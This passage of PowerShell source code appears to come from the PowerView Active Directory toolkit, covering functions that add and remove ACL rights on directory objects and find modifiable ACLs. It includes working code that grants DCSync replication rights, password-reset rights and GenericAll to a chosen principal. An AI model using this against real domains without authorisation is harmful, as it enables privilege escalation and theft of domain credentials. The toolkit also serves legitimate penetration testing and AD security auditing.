        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # ResetPassword doesn't need to know the user's current password
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # allows for the modification of group membership
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain's ACL, allows for the use of DCSync
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # add all the new ACEs to the specified object directory entry
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {
<#
.SYNOPSIS

Removes an ACL from a specific active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended
rights GUID can be set with -RightsGUID. These rights are removed from the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.
Defaults to 'All'.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

$UserSID = Get-DomainUser user | Select-Object -ExpandProperty objectsid
Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}

[no results returned]

Add-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID }

AceQualifier           : AccessAllowed
ObjectDN               : CN=user2,CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-883232822-274137685-4173207997-2105
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-883232822-274137685-4173207997-2104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0


Remove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $UserSID}

[no results returned]

.LINK

https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',

        [Guid]
        $RightsGUID
    )

    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = 'distinguishedname'
            'Raw' = $True
        }
        if ($PSBoundParameters['TargetDomain']) { $TargetSearcherArguments['Domain'] = $TargetDomain }
        if ($PSBoundParameters['TargetLDAPFilter']) { $TargetSearcherArguments['LDAPFilter'] = $TargetLDAPFilter }
        if ($PSBoundParameters['TargetSearchBase']) { $TargetSearcherArguments['SearchBase'] = $TargetSearchBase }
        if ($PSBoundParameters['Server']) { $TargetSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $TargetSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $TargetSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $TargetSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $TargetSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $TargetSearcherArguments['Credential'] = $Credential }

        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = 'distinguishedname,objectsid'
        }
        if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
        if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }

    PROCESS {
        $TargetSearcherArguments['Identity'] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments

        ForEach ($TargetObject in $Targets) {

            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 'None'
            $ControlType = [System.Security.AccessControl.AccessControlType] 'Allow'
            $ACEs = @()

            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    # ResetPassword doesn't need to know the user's current password
                    'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }
                    # allows for the modification of group membership
                    'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }
                    # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain's ACL, allows for the use of DCSync
                    'DCSync' { '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', '89e95b76-444d-4c62-991a-0facbeda640c'}
                }
            }

            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname)"

                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)

                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'ExtendedRight'
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] 'GenericAll'
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }

                    # remove all the specified ACEs from the specified object directory entry
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = 'Dacl'
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {
<#
.SYNOPSIS

Finds object ACLs in the current (or specified) domain with modification
rights set to non-built in objects.

Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectAcl, Get-DomainObject, Convert-ADName  

.DESCRIPTION

This function enumerates the ACLs for every object in the domain with Get-DomainObjectAcl,
and for each returned ACE entry it checks if principal security identifier
is *-1000 (meaning the account is not built in), and also checks if the rights for
the ACE mean the object can be modified by the principal. If these conditions are met,
then the security identifier SID is translated, the domain object is retrieved, and
additional IdentityReference* information is appended to the output object.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-InterestingDomainAcl

Finds interesting object ACLS in the current domain.

.EXAMPLE

Find-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs

Finds interesting object ACLS in the ev.testlab.local domain and
resolves rights GUIDs to display names.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingDomainAcl -Credential $Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $ACLArguments['ResolveGUIDs'] = $ResolveGUIDs }
        if ($PSBoundParameters['RightsFilter']) { $ACLArguments['RightsFilter'] = $RightsFilter }
        if ($PSBoundParameters['LDAPFilter']) { $ACLArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $ACLArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

        $ObjectSearcherArguments = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $ObjectSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ObjectSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ObjectSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ObjectSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ObjectSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ObjectSearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }

        # ongoing list of built-up SIDs
        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $ACLArguments['Domain'] = $Domain
            $ADNameArguments['Domain'] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                # only process SIDs > 1000
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        # "IdentityReferenceDN: $IdentityReferenceDN"

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            # "IdentityReferenceDomain: $IdentityReferenceDomain"
                            $ObjectSearcherArguments['Domain'] = $IdentityReferenceDomain
                            $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                            # "IdentityReferenceDN: $IdentityReferenceDN"
                            $Object = Get-DomainObject @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $IdentityReferenceClass = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $IdentityReferenceClass = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $IdentityReferenceClass = 'user'
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                # save so we don't look up more than once
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning "[Find-InterestingDomainAcl] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with Convert-ADName"
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {
<#
.SYNOPSIS

Search for all organization units (OUs) or specific OU objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
"-Properties whencreated,usnchanged,...". By default, all OU objects for
the current domain are returned.

.PARAMETER Identity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.

.PARAMETER GPLink

Only return OUs with the specified GUID in their gplink property.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainOU

Returns the current OUs in the domain.

.EXAMPLE

Get-DomainOU *admin* -Domain testlab.local

Returns all OUs with "admin" in their name in the testlab.local domain.

.EXAMPLE

Get-DomainOU -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"

Returns all OUs with linked to the specified group policy object.

.EXAMPLE

"*admin*","*server*" | Get-DomainOU

Search for OUs with the specific names.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainOU -Credential $Cred

.OUTPUTS

PowerView.OU

Custom PSObject with translated OU property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
